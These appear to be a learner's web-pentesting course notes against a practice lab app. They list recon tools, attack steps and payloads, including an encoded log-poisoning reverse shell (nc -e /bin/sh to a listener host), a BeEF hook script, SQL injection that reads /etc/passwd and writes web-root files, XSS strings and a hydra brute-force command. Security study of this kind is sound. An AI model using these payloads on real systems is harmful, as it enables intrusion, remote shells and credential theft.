Information Gathering
	whois lookup
	netcraft
	robtex - dns lookup
	knockpy -discover subdomains
	dirb, gobuster - find sensitive and hidden files and directories
	maltego - gather info about anything (people, websites, server)
File upload vulnerabilities (change file extension..)
	weevely - generate php shell (1. weevely generate password filename 2. weevely url password)
	metasploit - similar to weevely- create payload
	burp suite - proxy (intercepting requests)
Code execution vulnerabilties / cmd injection ( ';' - run multiple cmds, '|' - provides o/p of 1 cmd to another)
	wget cmd - upload any payload file
Local file inclusion vulnerabilty
	access files in the server (including outside www)
	1. /proc/self/environ (netcat listener) - update user agent in proxy		
	2. /var/log/auth.log ("ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4Ljg4LjEyOSAxMjM0'))?>"@192.168.88.130" - base64_decode = nc -e /bin/sh 192.168.88.129 1234
	3. /var/log/apache2/access.log
Remote file inclusion 
	1. reverse.txt - (provide the code injected file remotely)- not to be saved as .php, otherwise file will be exec in remote system and obtain reverse shell for remote system 
			 (worked when saved as reverse.php)	
	2. provide http as HTTP or hTTp or Http etc in url where loaction of remote file is located
	prevent - disable allow_url_fopen, allow_url_include(remote file inclusion), use static files (local file) 
SQL injection vulnerabilty
	Discovering in POST method - use "'", "and", "order by"
          - conatins client side filtering and server side  - check using burpsuite n bypass client side using burp
            eg- admin' #, ' or 1=1 #, ..
	Discover in GET method
	  - change parameters in url or login page (for special characters use encoded value)
          - union, ordey by..... (union select 1,databasde(), user(), version(), 5 #) with help of information_schema table -ie a default table with details of all databases in the server
	Advanced exploitation
	  - blind sql injection - does not display ant error messages
            1' or 1=1 , 1 and 1=1, 1 or 1=1, try bypass quotes using %27, or convert text to hex(0x"hex-value")
            use keyword limit strt_val,end_val if the page represents only 1 result at a time
	Read files using sql injectinn
	  - load_file("/etc/passwd") - union select null,load_file("/etc/passwd"), null,null #
	Upload files
     	  -- union select null,'contents_of_file', null,null into outfile '/var/www/......' # try diff paths to store file
	-- combination with file inclusion
	SQLMAP - tool does everything mentioned above with all types of db's
XSS vulnerability(persistent,reflected,DOM based) - code executed on client systems
	- try injecting JS code to text boxes, forms and url params
	Reflected -XSS
	  - eg- <script>alert("XSS")</script> (inject in url params n send to target)
                <IMG src=/ onerror="alert('xss')"></img>
	Stored XSS (stored on the page located in server)
	  - <scRIpt>alert(String.fromCharCode(120, 115, 115, 50))</scrIpt>
	BeEF Framework - hook vulnerable pages
	  -Reflected - <script src="http://192.168.88.129:3000/hook.js"></script>
	Veil Framework - generate undetectable backdoors
	  -- evasion - generate backdoors
   	  -- ordinance - generates a payload used by evasion
Bypass auth manipulating cookie values
	- change cookie values - use session token/ids (dynamic creation)
CSRF - tricking the server to perform any action that has not come from a legitimate user - prevent by embedding uniques tokens in html
Brute Force - covers all possible combinations
	    - use hydra - to brute force (gain access to anything like ftp,ssh,routers..)
		eg - hydra - hydra 192.168.88.130 -l admin -P /root/wordlist.txt http-post-form  "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
Dictionary attacks - try every password from the given list only
		     Create a wordlist using crunch (crunch 6 8 abc123@ -o test.txt)
